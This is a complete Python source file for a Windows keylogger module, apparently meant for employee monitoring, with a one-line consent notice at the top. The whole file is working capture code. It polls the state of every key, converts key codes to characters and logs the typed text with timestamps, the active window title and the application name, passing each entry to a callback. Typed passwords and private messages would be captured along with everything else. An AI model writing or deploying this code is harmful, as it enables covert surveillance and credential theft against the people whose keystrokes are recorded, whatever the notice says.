"""
Keylogger Module - Records all keystrokes
LEGAL NOTICE: Only use with employee consent and proper disclosure
"""

import threading
import time
from datetime import datetime
from collections import deque
import ctypes
from ctypes import wintypes

import win32con
import win32api

# Key code to character mapping for special keys
SPECIAL_KEYS = {
    win32con.VK_BACK: '[BACKSPACE]',
    win32con.VK_TAB: '[TAB]',
    win32con.VK_RETURN: '[ENTER]',
    win32con.VK_SHIFT: '[SHIFT]',
    win32con.VK_CONTROL: '[CTRL]',
    win32con.VK_MENU: '[ALT]',
    win32con.VK_PAUSE: '[PAUSE]',
    win32con.VK_CAPITAL: '[CAPSLOCK]',
    win32con.VK_ESCAPE: '[ESC]',
    win32con.VK_SPACE: ' ',
    win32con.VK_PRIOR: '[PAGEUP]',
    win32con.VK_NEXT: '[PAGEDOWN]',
    win32con.VK_END: '[END]',
    win32con.VK_HOME: '[HOME]',
    win32con.VK_LEFT: '[LEFT]',
    win32con.VK_UP: '[UP]',
    win32con.VK_RIGHT: '[RIGHT]',
    win32con.VK_DOWN: '[DOWN]',
    win32con.VK_INSERT: '[INSERT]',
    win32con.VK_DELETE: '[DELETE]',
    win32con.VK_LWIN: '[LWIN]',
    win32con.VK_RWIN: '[RWIN]',
    win32con.VK_F1: '[F1]',
    win32con.VK_F2: '[F2]',
    win32con.VK_F3: '[F3]',
    win32con.VK_F4: '[F4]',
    win32con.VK_F5: '[F5]',
    win32con.VK_F6: '[F6]',
    win32con.VK_F7: '[F7]',
    win32con.VK_F8: '[F8]',
    win32con.VK_F9: '[F9]',
    win32con.VK_F10: '[F10]',
    win32con.VK_F11: '[F11]',
    win32con.VK_F12: '[F12]',
}


class Keylogger:
    def __init__(self, on_keystroke_callback=None):
        self.running = False
        self.thread = None
        self.on_keystroke = on_keystroke_callback
        self.buffer = deque(maxlen=10000)
        self.current_window = ""
        self.current_app = ""
        self.lock = threading.Lock()
        self.last_keys = []  # Buffer for current typing session

    def get_key_state(self):
        """Get current modifier key states"""
        shift = win32api.GetAsyncKeyState(win32con.VK_SHIFT) & 0x8000
        ctrl = win32api.GetAsyncKeyState(win32con.VK_CONTROL) & 0x8000
        alt = win32api.GetAsyncKeyState(win32con.VK_MENU) & 0x8000
        caps = win32api.GetKeyState(win32con.VK_CAPITAL) & 1
        return shift, ctrl, alt, caps

    def vk_to_char(self, vk_code):
        """Convert virtual key code to character"""
        # Check for special keys first
        if vk_code in SPECIAL_KEYS:
            return SPECIAL_KEYS[vk_code]

        # Get keyboard state
        shift, ctrl, alt, caps = self.get_key_state()

        # Skip if Ctrl or Alt is pressed (likely a shortcut)
        if ctrl or alt:
            return None

        # Convert to character
        try:
            # Get the scan code
            scan_code = win32api.MapVirtualKey(vk_code, 0)

            # Get keyboard layout
            keyboard_layout = ctypes.windll.user32.GetKeyboardLayout(0)

            # Create keyboard state array
            keyboard_state = (ctypes.c_ubyte * 256)()
            ctypes.windll.user32.GetKeyboardState(keyboard_state)

            # Set shift state
            if shift:
                keyboard_state[win32con.VK_SHIFT] = 0x80

            # Convert to unicode
            buffer = (ctypes.c_wchar * 5)()
            result = ctypes.windll.user32.ToUnicodeEx(
                vk_code, scan_code, keyboard_state,
                buffer, len(buffer), 0, keyboard_layout
            )

            if result > 0:
                char = buffer[0]
                # Handle caps lock for letters
                if caps and char.isalpha():
                    char = char.upper() if not shift else char.lower()
                return char
        except Exception:
            pass

        return None

    def get_active_window_title(self):
        """Get the title of the currently active window"""
        try:
            import win32gui
            hwnd = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(hwnd) if hwnd else ""
        except Exception:
            return ""

    def get_active_app_name(self):
        """Get the name of the currently active application"""
        try:
            import win32gui
            import win32process
            import psutil
            hwnd = win32gui.GetForegroundWindow()
            if not hwnd:
                return "Unknown"
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            if pid:
                proc = psutil.Process(pid)
                return proc.name().replace('.exe', '')
            return "Unknown"
        except Exception:
            return "Unknown"

    def monitor_loop(self):
        """Main keylogging loop using polling method"""
        previous_state = {}

        while self.running:
            try:
                current_window = self.get_active_window_title()
                current_app = self.get_active_app_name()

                # Check if window or app changed
                if current_window != self.current_window or current_app != self.current_app:
                    if self.last_keys:
                        self._flush_buffer()
                    self.current_window = current_window
                    self.current_app = current_app

                # Poll all keys
                for vk_code in range(1, 255):
                    state = win32api.GetAsyncKeyState(vk_code)

                    # Key was pressed (transition from up to down)
                    if state & 0x0001:  # Key was pressed since last check
                        char = self.vk_to_char(vk_code)
                        if char:
                            self._record_key(char)

                time.sleep(0.01)  # 10ms polling interval

            except Exception as e:
                print(f"Keylogger error: {e}")
                time.sleep(0.1)

    def _record_key(self, char):
        """Record a keystroke"""
        self.last_keys.append(char)

        # Flush buffer on Enter or after 100 characters
        if char == '[ENTER]' or len(self.last_keys) >= 100:
            self._flush_buffer()

    def _flush_buffer(self):
        """Flush keystroke buffer to main buffer"""
        if not self.last_keys:
            return

        entry = {
            'timestamp': datetime.now().isoformat(),
            'window_title': self.current_window,
            'app_name': self.current_app or self.get_active_app_name(),
            'keystrokes': ''.join(self.last_keys)
        }

        with self.lock:
            self.buffer.append(entry)

        if self.on_keystroke:
            self.on_keystroke(entry)

        self.last_keys = []

    def start(self):
        """Start the keylogger"""
        if self.running:
            return

        self.running = True
        self.thread = threading.Thread(target=self.monitor_loop, daemon=True)
        self.thread.start()
        print("Keylogger started")

    def stop(self):
        """Stop the keylogger"""
        self.running = False
        self._flush_buffer()  # Flush remaining keys

        if self.thread:
            self.thread.join(timeout=2)
        print("Keylogger stopped")

    def get_logs(self, clear=True):
        """Get keystroke logs"""
        with self.lock:
            logs = list(self.buffer)
            if clear:
                self.buffer.clear()
        return logs


if __name__ == "__main__":
    def on_key(entry):
        print(f"[{entry['window_title'][:30]}] {entry['keystrokes']}")

    logger = Keylogger(on_keystroke_callback=on_key)
    logger.start()

    try:
        print("Keylogger running... Press Ctrl+C to stop")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.stop()
        print("\nLogs:")
        for log in logger.get_logs():
            print(f"  {log}")
